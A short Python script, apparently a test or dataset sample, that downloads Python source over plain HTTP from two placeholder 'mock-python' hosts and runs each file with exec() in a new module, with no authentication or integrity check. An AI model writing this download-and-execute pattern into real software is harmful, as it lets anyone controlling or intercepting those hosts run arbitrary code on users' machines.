import http.client
import types

def get_hosts_and_paths():
    return [("mock-python1", "/execute1.py"), ("mock-python2", "/execute2.py")]

def fetch_response(host, path):
    connection = http.client.HTTPConnection(host)
    connection.request("GET", path)
    response = connection.getresponse()
    source = response.read().decode('utf-8')
    connection.close()
    return source

def create_module():
    return types.ModuleType("sm")

def exec_code(src, module):
    exec(src, module.__dict__)

def main():
    hosts_and_paths = get_hosts_and_paths()
    for host, path in hosts_and_paths:
        source = fetch_response(host, path)
        module = create_module()
        exec_code(source, module)

main()
